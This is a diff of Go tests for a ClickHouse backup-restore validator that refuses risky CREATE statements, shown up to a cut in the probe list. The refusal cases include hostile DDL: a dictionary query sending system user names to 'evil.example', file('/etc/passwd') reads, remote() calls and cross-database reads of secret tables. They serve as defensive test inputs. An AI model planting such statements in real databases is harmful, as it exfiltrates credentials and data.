@@ -31,10 +31,8 @@ func TestCheckCreate(t *testing.T) {
 	}{
 		{"CREATE TABLE shop.events\n(\n    `d` Date\n)\nENGINE = MergeTree\nORDER BY d;\n", KindTable, "shop", "events"},
 		{"CREATE TABLE shop.`we/ird name` (`v` String) ENGINE = Memory", KindTable, "shop", "we/ird name"},
-		{"CREATE VIEW shop.v (`x` UInt8) AS SELECT 1 AS x", KindView, "shop", "v"},
-		{"CREATE MATERIALIZED VIEW shop.mv TO shop.t (`d` Date) AS SELECT d FROM shop.e", KindMaterializedView, "shop", "mv"},
-		{"CREATE DICTIONARY shop.d (`id` UInt64) PRIMARY KEY id SOURCE(CLICKHOUSE(DB 'shop' TABLE 'users')) LIFETIME(0) LAYOUT(FLAT())", KindDictionary, "shop", "d"},
-		{"CREATE DATABASE shop\nENGINE = Atomic", "database", "shop", ""},
+		{"CREATE TABLE shop.`.inner_id.1` (`v` String) ENGINE = Memory", KindMVInner, "shop", ".inner_id.1"},
+		{"CREATE DATABASE shop\nENGINE = Atomic", kindDatabase, "shop", ""},
 		{"CREATE TABLE \"shop\".\"t\" (x UInt8) ENGINE = Log", KindTable, "shop", "t"},
 	}
 	for _, c := range ok {
@@ -51,13 +49,13 @@ func TestCheckCreate(t *testing.T) {
 		{"CREATE TABLE other.t (x UInt8) ENGINE = Log", KindTable, "shop", "t", "creates other.t"},
 		{"CREATE TABLE shop.u (x UInt8) ENGINE = Log", KindTable, "shop", "t", "creates shop.u"},
 		{"CREATE TABLE t (x UInt8) ENGINE = Log", KindTable, "shop", "t", "database"},
-		{"CREATE VIEW shop.t AS SELECT 1", KindTable, "shop", "t", "a view"},
+		{"CREATE VIEW shop.t AS SELECT 1", KindTable, "shop", "t", "does not create a table"},
 		{"CREATE OR REPLACE TABLE shop.t (x UInt8) ENGINE = Log", KindTable, "shop", "t", "OR REPLACE"},
 		{"CREATE TABLE IF NOT EXISTS shop.t (x UInt8) ENGINE = Log", KindTable, "shop", "t", "IF NOT EXISTS"},
 		{"CREATE TEMPORARY TABLE shop.t (x UInt8) ENGINE = Log", KindTable, "shop", "t", "TEMPORARY"},
 		{"CREATE TABLE shop.t ON CLUSTER c (x UInt8) ENGINE = Log", KindTable, "shop", "t", "ON CLUSTER"},
-		{"CREATE DATABASE other ENGINE = Atomic", "database", "shop", "", "creates database other"},
-		{"CREATE DATABASE shop ON CLUSTER c", "database", "shop", "", "ON CLUSTER"},
+		{"CREATE DATABASE other ENGINE = Atomic", kindDatabase, "shop", "", "creates database other"},
+		{"CREATE DATABASE shop ON CLUSTER c", kindDatabase, "shop", "", "ON CLUSTER"},
 		{"ATTACH TABLE shop.t (x UInt8) ENGINE = Log", KindTable, "shop", "t", "not a CREATE"},
 	}
 	for _, c := range bad {
@@ -66,9 +64,19 @@ func TestCheckCreate(t *testing.T) {
 			t.Errorf("%q: want error with %q, got %v", c.stmt, c.why, err)
 		}
 	}
+	// CREATE DATABASE takes an engine and a comment, nothing else.
+	for stmt, want := range map[string]bool{
+		"CREATE DATABASE shop": true, "CREATE DATABASE shop ENGINE = Atomic COMMENT 'x'": true,
+		"CREATE DATABASE shop ENGINE = Lazy(60)": true, "CREATE DATABASE shop ENGINE = Atomic SETTINGS x = 1": false,
+	} {
+		st, err := checkCreate(stmt, kindDatabase, "shop", "")
+		if err != nil || (st.databaseProblem() == "") != want {
+			t.Errorf("%q: %v %q", stmt, err, st.databaseProblem())
+		}
+	}
 }
 
-func TestCheckCreateDropsUUID(t *testing.T) {
+func TestCheckCreateEdits(t *testing.T) {
 	st, err := checkCreate("CREATE TABLE shop.t UUID '6b2b0f4b-0d36-4bd4-9a0e-7d3b1e5c2f10' (x UInt8) ENGINE = Log", KindTable, "shop", "t")
 	if err != nil {
 		t.Fatal(err)
@@ -76,12 +84,13 @@ func TestCheckCreateDropsUUID(t *testing.T) {
 	if got := st.sql(); got != "CREATE TABLE shop.t (x UInt8) ENGINE = Log" {
 		t.Fatalf("sql: %q", got)
 	}
-	st, err = checkCreate("CREATE MATERIALIZED VIEW shop.mv TO INNER UUID '6b2b0f4b-0d36-4bd4-9a0e-7d3b1e5c2f10' (x UInt8) ENGINE = Log AS SELECT 1 AS x", KindMaterializedView, "shop", "mv")
+	st, err = checkCreate("CREATE TABLE shop.`.inner_id.6b2b` (`d` Date) ENGINE = SummingMergeTree ORDER BY d", KindMVInner, "shop", ".inner_id.6b2b")
 	if err != nil {
 		t.Fatal(err)
 	}
-	if got := st.sql(); strings.Contains(got, "UUID") || strings.Contains(got, "INNER") {
-		t.Fatalf("sql: %q", got)
+	st.rename("mv`x__restored_data")
+	if got := st.sql(); got != "CREATE TABLE shop.`mv\\`x__restored_data` (`d` Date) ENGINE = SummingMergeTree ORDER BY d" {
+		t.Fatalf("renamed: %q", got)
 	}
 }
 
@@ -99,9 +108,6 @@ func TestRewriteReplicatedPath(t *testing.T) {
 			"CREATE TABLE shop.r (x UInt64, s Int8) ENGINE = ReplicatedCollapsingMergeTree('/olympos-restore/" + id + "/clickhouse/tables/{uuid}/{shard}', '{replica}', s) ORDER BY x"},
 		{"CREATE TABLE shop.r (x UInt64) ENGINE = ReplicatedMergeTree ORDER BY x",
 			"CREATE TABLE shop.r (x UInt64) ENGINE = ReplicatedMergeTree('/olympos-restore/" + id + "/clickhouse/tables/{uuid}/{shard}', '{replica}') ORDER BY x"},
-		// A materialized view's inner engine.
-		{"CREATE MATERIALIZED VIEW shop.mv (`d` Date) ENGINE = ReplicatedSummingMergeTree('/ch/mv', '{replica}') ORDER BY d AS SELECT d FROM shop.e",
-			"CREATE MATERIALIZED VIEW shop.mv (`d` Date) ENGINE = ReplicatedSummingMergeTree('/olympos-restore/" + id + "/ch/mv', '{replica}') ORDER BY d AS SELECT d FROM shop.e"},
 	}
 	for _, c := range cases {
 		got, ok := rewriteReplicatedPath(c.in, id)
@@ -113,6 +119,7 @@ func TestRewriteReplicatedPath(t *testing.T) {
 		"CREATE TABLE shop.t (x UInt64) ENGINE = MergeTree ORDER BY x",
 		"CREATE TABLE shop.t (`ReplicatedMergeTree('/a', 'b')` UInt8) ENGINE = Log",
 		"CREATE VIEW shop.v AS SELECT 'ENGINE = ReplicatedMergeTree(''/a'', ''b'')' AS x",
+		"CREATE MATERIALIZED VIEW shop.mv (`d` Date) ENGINE = ReplicatedSummingMergeTree('/ch/mv', '{replica}') ORDER BY d AS SELECT d FROM shop.e",
 	} {
 		if got, ok := rewriteReplicatedPath(in, id); ok || got != in {
 			t.Errorf("rewrite(%q) = %q %v, want unchanged", in, got, ok)
@@ -120,169 +127,136 @@ func TestRewriteReplicatedPath(t *testing.T) {
 	}
 }
 
-func TestClassify(t *testing.T) {
-	restored := map[string]bool{"shop": true, "billing": true}
+func TestClassifyTables(t *testing.T) {
 	tbl := func(name, engine string) Table { return Table{Name: name, Kind: KindTable, Engine: engine} }
-	cases := []struct {
-		t      Table
-		ddl    string
-		create bool
-		why    string // in the skip reason
+	created := []struct {
+		t   Table
+		ddl string
 	}{
-		{tbl("e", "MergeTree"), "CREATE TABLE shop.e (x UInt8) ENGINE = MergeTree ORDER BY x", true, ""},
-		{tbl("l", "TinyLog"), "CREATE TABLE shop.l (x UInt8) ENGINE = TinyLog", true, ""},
-		{tbl("n", "Null"), "CREATE TABLE shop.n (x UInt8) ENGINE = Null", true, ""},
-		{tbl("m", "Merge"), "CREATE TABLE shop.m (x UInt8) ENGINE = Merge('shop', '^e$')", true, ""},
-		{tbl("m2", "Merge"), "CREATE TABLE shop.m2 (x UInt8) ENGINE = Merge(other, '^e$')", false, "database other"},
-		{tbl("m3", "Merge"), "CREATE TABLE shop.m3 (x UInt8) ENGINE = Merge(REGEXP('^s'), '^e$')", false, "pattern"},
-		{tbl("b", "Buffer"), "CREATE TABLE shop.b (x UInt8) ENGINE = Buffer(billing, e, 1, 10, 100, 1, 10, 1, 10)", true, ""},
-		{tbl("b2", "Buffer"), "CREATE TABLE shop.b2 (x UInt8) ENGINE = Buffer('other', 'e', 1, 10, 100, 1, 10, 1, 10)", false, "database other"},
-		{tbl("k", "Kafka"), "CREATE TABLE shop.k (x String) ENGINE = Kafka SETTINGS kafka_broker_list = 'b:9092'", false, "Kafka"},
-		{tbl("s", "S3"), "CREATE TABLE shop.s (x String) ENGINE = S3('https://bucket/x', 'KEY', 'SECRET', 'CSV')", false, "S3"},
-		{tbl("d", "Distributed"), "CREATE TABLE shop.d (x String) ENGINE = Distributed('c', 'shop', 'e')", false, "cluster"},
-		{tbl("p", "PostgreSQL"), "CREATE TABLE shop.p (x String) ENGINE = PostgreSQL('h:5432', 'db', 't', 'u', 'pw')", false, "PostgreSQL"},
-		{tbl("x", "SomethingNew"), "CREATE TABLE shop.x (x String) ENGINE = SomethingNew", false, "SomethingNew"},
-		{tbl("w", "MergeTree"), "CREATE TABLE shop.w (x String) ENGINE = MergeTree ORDER BY x SETTINGS disk = disk(type = s3, endpoint = 'https://b/')", false, "disk"},
-		{tbl("f", "MergeTree"), "CREATE TABLE shop.f (x String DEFAULT file('/etc/passwd')) ENGINE = MergeTree ORDER BY x", false, "file"},
-		{tbl("tf", "URL"), "CREATE TABLE shop.tf AS url('http://x/', 'CSV', 'a String')", false, "URL"},
-		{tbl("e2", "Log"), "CREATE TABLE shop.e2 (x UInt8) ENGINE = MergeTree ORDER BY x", false, "engine MergeTree, the backup recorded Log"},
-		// Views.
-		{Table{Name: "v", Kind: KindView}, "CREATE VIEW shop.v (x UInt8) AS SELECT x FROM billing.t", true, ""},
-		{Table{Name: "v1", Kind: KindView}, "CREATE VIEW shop.v1 (x UInt8) AS SELECT x FROM other.t", false, "reads other.t"},
-		{Table{Name: "v2", Kind: KindView}, "CREATE VIEW shop.v2 (x String) AS SELECT * FROM s3('https://b/x.csv')", false, "s3"},
-		{Table{Name: "v3", Kind: KindView}, "CREATE VIEW shop.v3 (x String) AS SELECT * FROM remote('h:9000', db.t, 'u', 'pw')", false, "remote"},
-		// Materialized views.
-		{Table{Name: "mv", Kind: KindMaterializedView, Engine: "MaterializedView"}, "CREATE MATERIALIZED VIEW shop.mv (d Date) ENGINE = SummingMergeTree ORDER BY d AS SELECT d FROM shop.e", true, ""},
-		{Table{Name: "mv2", Kind: KindMaterializedView, Engine: "MaterializedView"}, "CREATE MATERIALIZED VIEW shop.mv2 TO billing.t (d Date) AS SELECT d FROM shop.e", true, ""},
-		{Table{Name: "mv3", Kind: KindMaterializedView, Engine: "MaterializedView"}, "CREATE MATERIALIZED VIEW shop.mv3 TO other.t (d Date) AS SELECT d FROM shop.e", false, "writes into other.t"},
-		{Table{Name: "mv4", Kind: KindMaterializedView, Engine: "MaterializedView"}, "CREATE MATERIALIZED VIEW shop.mv4 TO shop.t (d Date) AS SELECT d FROM other.e", false, "reads other.e"},
-		{Table{Name: "mv5", Kind: KindMaterializedView, Engine: "MaterializedView"}, "CREATE MATERIALIZED VIEW shop.mv5 (d Date) ENGINE = Kafka AS SELECT d FROM shop.e", false, "Kafka"},
-		// Dictionaries.
-		{Table{Name: "dc", Kind: KindDictionary}, "CREATE DICTIONARY shop.dc (id UInt64) PRIMARY KEY id SOURCE(CLICKHOUSE(DB 'billing' TABLE 'users' USER 'u' PASSWORD '[HIDDEN]')) LIFETIME(0) LAYOUT(FLAT())", true, ""},
-		{Table{Name: "dc2", Kind: KindDictionary}, "CREATE DICTIONARY shop.dc2 (id UInt64) PRIMARY KEY id SOURCE(CLICKHOUSE(HOST 'ch.other' PORT 9000 DB 'shop' TABLE 'users')) LIFETIME(0) LAYOUT(FLAT())", false, "host"},
-		{Table{Name: "dc3", Kind: KindDictionary}, "CREATE DICTIONARY shop.dc3 (id UInt64) PRIMARY KEY id SOURCE(CLICKHOUSE(DB 'other' TABLE 'users')) LIFETIME(0) LAYOUT(FLAT())", false, "database other"},
-		{Table{Name: "dc4", Kind: KindDictionary}, "CREATE DICTIONARY shop.dc4 (id UInt64) PRIMARY KEY id SOURCE(MYSQL(HOST 'h' DB 'd' TABLE 't' USER 'u' PASSWORD 'p')) LIFETIME(0) LAYOUT(FLAT())", false, "MYSQL"},
-		{Table{Name: "dc5", Kind: KindDictionary}, "CREATE DICTIONARY shop.dc5 (id UInt64) PRIMARY KEY id SOURCE(CLICKHOUSE(QUERY 'SELECT * FROM other.t')) LIFETIME(0) LAYOUT(FLAT())", false, "QUERY"},
-		{Table{Name: "dc6", Kind: KindDictionary}, "CREATE DICTIONARY shop.dc6 (id UInt64) PRIMARY KEY id SOURCE(CLICKHOUSE(HOST 'localhost' DB 'shop' TABLE 'users')) LIFETIME(0) LAYOUT(FLAT())", true, ""},
-		{Table{Name: "lv", Kind: KindOther, Engine: "LiveView"}, "CREATE LIVE VIEW shop.lv AS SELECT 1", false, "LiveView"},
+		{tbl("e", "MergeTree"), "CREATE TABLE shop.e (`d` Date, `id` UInt64, `s` LowCardinality(Nullable(String)), `v2` UInt64 MATERIALIZED id * 2, " +
+			"`h` UInt64 DEFAULT cityHash64(s), `ts` DateTime DEFAULT now(), `a` Array(String) CODEC(ZSTD(1)), " +
+			"INDEX ix (id, s) TYPE bloom_filter(0.01) GRANULARITY 4) ENGINE = MergeTree PARTITION BY toYYYYMM(d) ORDER BY (d, id) " +
+			"TTL d + toIntervalDay(30) SETTINGS index_granularity = 8192, storage_policy = 'default'"},
+		{tbl("agg", "AggregatingMergeTree"), "CREATE TABLE shop.agg (`k` UInt8, `u` AggregateFunction(quantiles(0.5, 0.9), UInt64)) ENGINE = AggregatingMergeTree ORDER BY k SETTINGS index_granularity = 8192"},
+		{tbl("r", "ReplicatedReplacingMergeTree"), "CREATE TABLE shop.r (`x` UInt64, `v` UInt8) ENGINE = ReplicatedReplacingMergeTree('/p', '{replica}', v) ORDER BY x"},
+		{tbl("l", "TinyLog"), "CREATE TABLE shop.l (x UInt8) ENGINE = TinyLog"},
+		{tbl("m", "Memory"), "CREATE TABLE shop.m (x UInt8) ENGINE = Memory COMMENT 'kept'"},
+		{tbl("c", "MergeTree"), "CREATE TABLE shop.c (x UInt8) ENGINE = MergeTree ORDER BY x SETTINGS index_granularity = 8192 COMMENT 'x'"},
 	}
-	for _, c := range cases {
-		o, err := classify("shop", c.t, c.ddl, restored)
+	for _, c := range created {
+		o, err := classify("shop", c.t, c.ddl)
+		if err != nil || !o.create {
+			t.Errorf("%s: %v %q", c.t.Name, err, o.reason)
+		}
+	}
+	skipped := []struct {
+		t        Table
+		ddl, why string
+	}{
+		{tbl("k", "Kafka"), "CREATE TABLE shop.k (x String) ENGINE = Kafka SETTINGS kafka_broker_list = 'b:9092'", "engine Kafka"},
+		{tbl("s", "S3"), "CREATE TABLE shop.s (x String) ENGINE = S3('https://bucket/x', 'KEY', 'SECRET', 'CSV')", "engine S3"},
+		{tbl("d", "Distributed"), "CREATE TABLE shop.d (x String) ENGINE = Distributed('c', 'shop', 'e')", "cluster"},
+		{tbl("m", "Merge"), "CREATE TABLE shop.m (x UInt8) ENGINE = Merge('shop', '^e$')", "engine Merge"},
+		{tbl("b", "Buffer"), "CREATE TABLE shop.b (x UInt8) ENGINE = Buffer(shop, e, 1, 10, 100, 1, 10, 1, 10)", "engine Buffer"},
+		{tbl("dt", "Dictionary"), "CREATE TABLE shop.dt (id UInt64) ENGINE = Dictionary(xmldict)", "engine Dictionary"},
+		{tbl("j", "Join"), "CREATE TABLE shop.j (id UInt64) ENGINE = Join(ANY, LEFT, id)", "engine Join"},
+		{tbl("st", "Set"), "CREATE TABLE shop.st (id UInt64) ENGINE = Set", "engine Set"},
+		{tbl("km", "KeeperMap"), "CREATE TABLE shop.km (k String, v String) ENGINE = KeeperMap('/km') PRIMARY KEY k", "engine KeeperMap"},
+		{tbl("rk", "EmbeddedRocksDB"), "CREATE TABLE shop.rk (k String, v String) ENGINE = EmbeddedRocksDB(0, '/var/lib/x', 1) PRIMARY KEY k", "engine EmbeddedRocksDB"},
+		{tbl("n", "Null"), "CREATE TABLE shop.n (x UInt8) ENGINE = Null", "engine Null"},
+		{tbl("x", "SomethingNew"), "CREATE TABLE shop.x (x String) ENGINE = SomethingNew", "SomethingNew"},
+		{tbl("tf", "URL"), "CREATE TABLE shop.tf AS url('http://x/', 'CSV', 'a String')", "AS"},
+		{tbl("cp", "MergeTree"), "CREATE TABLE shop.cp AS shop.e ENGINE = MergeTree ORDER BY x", "AS"},
+		{tbl("em", "MergeTree"), "CREATE TABLE shop.em ENGINE = MergeTree ORDER BY x EMPTY AS SELECT 1 AS x", "AS"},
+		// Settings outside the allowlist.
+		{tbl("w", "MergeTree"), "CREATE TABLE shop.w (x String) ENGINE = MergeTree ORDER BY x SETTINGS disk = disk(type = s3, endpoint = 'https://b/')", "setting disk"},
+		{tbl("w2", "MergeTree"), "CREATE TABLE shop.w2 (x String) ENGINE = MergeTree ORDER BY x SETTINGS disk = 'default'", "setting disk"},
+		{tbl("w3", "MergeTree"), "CREATE TABLE shop.w3 (x String) ENGINE = MergeTree ORDER BY x SETTINGS index_granularity = 8192, min_age_to_force_merge_seconds = 1", "min_age_to_force_merge_seconds"},
+		{tbl("w4", "MergeTree"), "CREATE TABLE shop.w4 (x String SETTINGS (max_compress_block_size = 1)) ENGINE = MergeTree ORDER BY x", "SETTINGS"},
+		// Expressions.
+		{tbl("f", "MergeTree"), "CREATE TABLE shop.f (x String DEFAULT file('/etc/passwd')) ENGINE = MergeTree ORDER BY x", "file()"},
+		{tbl("h", "MergeTree"), "CREATE TABLE shop.h (x UInt64, y String DEFAULT hostName()) ENGINE = MergeTree ORDER BY x", "hostName()"},
+		{tbl("cd", "MergeTree"), "CREATE TABLE shop.cd (x UInt64, y String DEFAULT currentDatabase()) ENGINE = MergeTree ORDER BY x", "currentDatabase()"},
+		{tbl("gm", "MergeTree"), "CREATE TABLE shop.gm (x UInt64, y String DEFAULT getMacro('shard')) ENGINE = MergeTree ORDER BY x", "getMacro()"},
+		{tbl("sq", "MergeTree"), "CREATE TABLE shop.sq (`k` String DEFAULT (SELECT any(x) FROM paimonS3('http://e/', 'k', 's'))) ENGINE = MergeTree ORDER BY k", "query"},
+		{tbl("in", "MergeTree"), "CREATE TABLE shop.in (`k` UInt64 DEFAULT k IN (1, 2)) ENGINE = MergeTree ORDER BY k", "IN"},
+		{tbl("ni", "MergeTree"), "CREATE TABLE shop.ni (`k` UInt64 DEFAULT nullIn(k, secret.t)) ENGINE = MergeTree ORDER BY k", "nullIn()"},
+		{tbl("qf", "MergeTree"), "CREATE TABLE shop.qf (`k` UInt64 DEFAULT `file`('x')) ENGINE = MergeTree ORDER BY k", "file()"},
+		{tbl("pr", "MergeTree"), "CREATE TABLE shop.pr (`k` UInt64, PROJECTION p (SELECT k ORDER BY k)) ENGINE = MergeTree ORDER BY k", "query"},
+		{tbl("na", "MergeTree"), "CREATE TABLE shop.na (`k` UInt64 COMMENT 'é') ENGINE = MergeTree ORDER BY k", ""},
+		{tbl("nb", "MergeTree"), "CREATE TABLE shop.nb (`k` UInt64\u00a0DEFAULT 1) ENGINE = MergeTree ORDER BY k", "outside ASCII"},
+	}
+	for _, c := range skipped {
+		o, err := classify("shop", c.t, c.ddl)
 		if err != nil {
-			if c.why != "" && strings.Contains(err.Error(), c.why) && !c.create {
-				continue
-			}
 			t.Errorf("%s: %v", c.t.Name, err)
 			continue
 		}
-		if o.create != c.create || (c.why != "" && !strings.Contains(o.reason, c.why)) {
-			t.Errorf("%s: create=%v reason=%q, want create=%v reason with %q", c.t.Name, o.create, o.reason, c.create, c.why)
-		}
-		if !o.create && (strings.Contains(o.reason, "SECRET") || strings.Contains(o.reason, "pw") || strings.Contains(o.reason, "https://")) {
-			t.Errorf("%s: reason carries DDL: %q", c.t.Name, o.reason)
-		}
-	}
-}
-
-func TestScanRefs(t *testing.T) {
-	cases := []struct{ stmt, refs, why string }{
-		{"CREATE MATERIALIZED VIEW shop.mv TO shop.t (d Date) AS SELECT d FROM shop.k AS k JOIN `billing`.u ON k.x = u.x LEFT JOIN e USING (d)",
-			"shop.k,billing.u,shop.e", ""},
-		// Comma joins, subqueries, IN, CTEs, string-named objects.
-		{"CREATE VIEW shop.v AS WITH c AS (SELECT 1 AS x) SELECT s.x FROM shop.src AS e, secret.creds AS s, c " +
-			"WHERE e.x IN (SELECT x FROM other.t) AND e.y IN billing.ids AND e.z IN tuple(1, 2) AND dictGet('d2', 'v', e.x) = '' " +
-			"AND joinGet('billing.j', 'v', e.x) = 1",
-			"shop.src,secret.creds,other.t,billing.ids,shop.d2,billing.j", ""},
-		{"CREATE VIEW shop.v AS SELECT extract(DAY FROM d) AS a, trim(BOTH ' ' FROM s) AS b FROM shop.t ARRAY JOIN arr AS x, t.arr2 AS y",
-			"shop.t", ""},
-		{"CREATE VIEW shop.v AS SELECT * FROM numbers(10) UNION ALL SELECT * FROM merge('billing', '^t') UNION ALL SELECT * FROM loop(shop, t)",
-			"billing.*,shop.*", ""},
-		{"CREATE VIEW shop.v AS SELECT * FROM view(SELECT * FROM other.t)", "other.t", ""},
-		{"CREATE TABLE shop.t (`k` String DEFAULT (SELECT any(x) FROM other.t)) ENGINE = MergeTree ORDER BY k", "other.t", ""},
-		// Fail closed.
-		{"CREATE VIEW shop.v AS SELECT * FROM url('http://e/', 'CSV', 'x String')", "", "table function url()"},
-		{"CREATE VIEW shop.v AS SELECT * FROM `url`('http://e/', 'CSV', 'x String')", "", "table function url()"},
-		{"CREATE VIEW shop.v AS SELECT * FROM url ('http://e/', 'CSV', 'x String')", "", "table function url()"},
-		{"CREATE VIEW shop.v AS SELECT * FROM mergeTreeIndex(shop, t)", "", "table function mergeTreeIndex()"},
-		{"CREATE VIEW shop.v AS SELECT * FROM merge(REGEXP('.*'), '.*')", "", "pattern"},
-		{"CREATE VIEW shop.v AS SELECT * FROM shop.t WHERE x IN url('http://e/', 'CSV', 'x String')", "", "url()"},
-		{"CREATE VIEW shop.v AS SELECT dictGet(concat('se', 'cret.d'), 'v', 1) AS x", "", "dictGet() with an object name"},
-		{"CREATE VIEW shop.v AS SELECT file('/etc/passwd') AS x", "", "file()"},
-		{"CREATE VIEW shop.v AS SELECT * FROM a.b.c", "", "cannot read"},
-		{"CREATE TABLE shop.t (`k` String DEFAULT (SELECT any(x) FROM paimonS3('http://e/', 'k', 's'))) ENGINE = MergeTree ORDER BY k", "", "paimonS3"},
-	}
-	for _, c := range cases {
-		kind := KindView
-		name := "v"
-		switch {
-		case strings.HasPrefix(c.stmt, "CREATE MATERIALIZED"):
-			kind, name = KindMaterializedView, "mv"
-		case strings.HasPrefix(c.stmt, "CREATE TABLE"):
-			kind, name = KindTable, "t"
-		}
-		st, err := checkCreate(c.stmt, kind, "shop", name)
-		if err != nil {
-			t.Fatalf("%q: %v", c.stmt, err)
-		}
-		refs, why := st.scanRefs("shop")
-		if c.why != "" {
-			if !strings.Contains(why, c.why) {
-				t.Errorf("%q: why %q, want %q", c.stmt, why, c.why)
+		if c.why == "" {
+			if !o.create {
+				t.Errorf("%s: not created: %q", c.t.Name, o.reason)
 			}
 			continue
 		}
-		if why != "" || strings.Join(refs, ",") != c.refs {
-			t.Errorf("%q:\n refs %q why %q\nwant %q", c.stmt, strings.Join(refs, ","), why, c.refs)
+		if o.create || !strings.Contains(o.reason, c.why) {
+			t.Errorf("%s: create=%v reason=%q, want a skip with %q", c.t.Name, o.create, o.reason, c.why)
+		}
+		if strings.Contains(o.reason, "SECRET") || strings.Contains(o.reason, "https://") || strings.Contains(o.reason, "b:9092") {
+			t.Errorf("%s: reason carries DDL: %q", c.t.Name, o.reason)
 		}
 	}
-	st, _ := checkCreate("CREATE MATERIALIZED VIEW shop.mv TO shop.t (d Date) AS SELECT d FROM shop.k", KindMaterializedView, "shop", "mv")
-	if db, name, ok := st.mvTarget("shop"); !ok || db != "shop" || name != "t" {
-		t.Fatalf("target: %s %s %v", db, name, ok)
+	// The schema entry disagrees with the manifest's engine: refused.
+	if _, err := classify("shop", tbl("e2", "Log"), "CREATE TABLE shop.e2 (x UInt8) ENGINE = MergeTree ORDER BY x"); err == nil ||
+		!strings.Contains(err.Error(), "the backup recorded Log") {
+		t.Errorf("engine mismatch: %v", err)
 	}
 }
 
-// TestReviewProbes are the review's probes (ClickHouse 24.8 confirmed each
-// bypass): none of them is created.
+// TestReviewProbes are the reviews' probes (rounds 1 and 2, confirmed on
+// ClickHouse 24.8; the sc_* ones are real SHOW CREATE output): views,
+// materialized views and dictionaries are never created, whatever they
+// hold, and the table probes are not created either.
 func TestReviewProbes(t *testing.T) {
-	restored := map[string]bool{"shop": true}
-	cases := []struct{ name, kind, engine, ddl, why string }{
-		{"dict INVALIDATE_QUERY url", KindDictionary, "", "CREATE DICTIONARY shop.d (`id` UInt64) PRIMARY KEY id SOURCE(CLICKHOUSE(DB 'shop' TABLE 'users' INVALIDATE_QUERY 'SELECT count() FROM url(''http://evil.example/?'' || (SELECT groupArray(name) FROM system.users)::String, CSV, ''a String'')')) LIFETIME(10) LAYOUT(FLAT())", "INVALIDATE_QUERY"},
-		{"dict WHERE remote", KindDictionary, "", "CREATE DICTIONARY shop.d (`id` UInt64) PRIMARY KEY id SOURCE(CLICKHOUSE(DB 'shop' TABLE 'users' WHERE 'id IN (SELECT 1 FROM remote(''source-ch:9000'', system.one))')) LIFETIME(10) LAYOUT(FLAT())", "WHERE"},
-		{"dict UPDATE_FIELD", KindDictionary, "", "CREATE DICTIONARY shop.d (`id` UInt64) PRIMARY KEY id SOURCE(CLICKHOUSE(DB 'shop' TABLE 'users' UPDATE_FIELD 'x')) LIFETIME(10) LAYOUT(FLAT())", "UPDATE_FIELD"},
-		{"dict duplicate HOST", KindDictionary, "", "CREATE DICTIONARY shop.d (`id` UInt64) PRIMARY KEY id SOURCE(CLICKHOUSE(HOST 'source-ch.prod.svc' PORT 9000 USER 'u' PASSWORD '[HIDDEN]' DB 'shop' TABLE 'users' HOST 'localhost')) LIFETIME(10) LAYOUT(FLAT())", "twice"},
-		{"dict duplicate DB", KindDictionary, "", "CREATE DICTIONARY shop.d (`id` UInt64) PRIMARY KEY id SOURCE(CLICKHOUSE(DB 'secret' TABLE 'users' DB 'shop')) LIFETIME(10) LAYOUT(FLAT())", "twice"},
-		{"dict duplicate LIFETIME key", KindDictionary, "", "CREATE DICTIONARY shop.d (`id` UInt64) PRIMARY KEY id SOURCE(CLICKHOUSE(DB 'shop' TABLE 'users')) LIFETIME(MIN 0 MIN 5) LAYOUT(FLAT())", "repeats MIN"},
-		{"dict duplicate LAYOUT key", KindDictionary, "", "CREATE DICTIONARY shop.d (`id` UInt64) PRIMARY KEY id SOURCE(CLICKHOUSE(DB 'shop' TABLE 'users')) LIFETIME(0) LAYOUT(HASHED(SHARDS 2 SHARDS 4))", "repeats SHARDS"},
-		{"dict expression reads other db", KindDictionary, "", "CREATE DICTIONARY shop.d (`id` UInt64, `v` String EXPRESSION dictGet('secret.d', 'v', id)) PRIMARY KEY id SOURCE(CLICKHOUSE(DB 'shop' TABLE 'users')) LIFETIME(0) LAYOUT(FLAT())", "secret.d"},
-		{"view unicode-quote hides url()", KindView, "", "CREATE VIEW shop.v AS SELECT ‘'’ AS a, x FROM url('http://e/', 'CSV', 'x String') -- '", "outside ASCII"},
-		{"view NBSP between url and (", KindView, "", "CREATE VIEW shop.v AS SELECT * FROM url\u00a0('http://e/', 'CSV', 'x String')", "outside ASCII"},
-		{"view backquoted table function", KindView, "", "CREATE VIEW shop.v AS SELECT * FROM `url`('http://e/', 'CSV', 'x String')", "url()"},
-		{"MV comma join other db", KindMaterializedView, "", "CREATE MATERIALIZED VIEW shop.mv TO shop.t (`x` String) DEFINER = default SQL SECURITY DEFINER AS SELECT s.x FROM shop.src AS e, secret.creds AS s", "secret.creds"},
-		{"MV merge() all dbs", KindMaterializedView, "", "CREATE MATERIALIZED VIEW shop.mv TO shop.t (`x` String) AS SELECT x FROM shop.src WHERE x IN (SELECT x FROM merge(REGEXP('.*'), '.*'))", "pattern"},
-		{"MV joinGet other db", KindMaterializedView, "", "CREATE MATERIALIZED VIEW shop.mv TO shop.t (`x` String) AS SELECT joinGet('secret.j', 'v', x) AS x FROM shop.src", "secret.j"},
-		{"view DEFINER reads other db", KindView, "", "CREATE VIEW shop.v (`x` String) DEFINER = default SQL SECURITY DEFINER AS SELECT x FROM secret.creds", "secret.creds"},
-		{"table EmbeddedRocksDB dir", KindTable, "EmbeddedRocksDB", "CREATE TABLE shop.t (`k` String, `v` String) ENGINE = EmbeddedRocksDB(0, '/var/lib/clickhouse/store/abc/other_rocksdb', 1) PRIMARY KEY k", "path"},
-		{"table setting path", KindTable, "MergeTree", "CREATE TABLE shop.t (`k` String) ENGINE = MergeTree ORDER BY k SETTINGS storage_policy = '/x'", "path"},
-		{"table paimonS3 default", KindTable, "MergeTree", "CREATE TABLE shop.t (`k` String DEFAULT (SELECT any(x) FROM paimonS3('http://e/', 'k', 's'))) ENGINE = MergeTree ORDER BY k", "paimonS3"},
-		{"MV refreshable", KindMaterializedView, "", "CREATE MATERIALIZED VIEW shop.mv REFRESH EVERY 1 HOUR TO shop.t (`x` String) AS SELECT x FROM shop.src", "refreshable"},
+	others := []struct{ kind, ddl string }{
+		{KindDictionary, "CREATE DICTIONARY shop.d (`id` UInt64) PRIMARY KEY id SOURCE(CLICKHOUSE(DB 'shop' TABLE 'users' INVALIDATE_QUERY 'SELECT count() FROM url(''http://evil.example/'')')) LIFETIME(10) LAYOUT(FLAT())"},
+		{KindDictionary, "CREATE DICTIONARY shop.d (`id` UInt64) PRIMARY KEY id SOURCE(CLICKHOUSE(HOST 'source-ch.prod.svc' DB 'shop' TABLE 'users' HOST 'localhost')) LIFETIME(10) LAYOUT(FLAT())"},
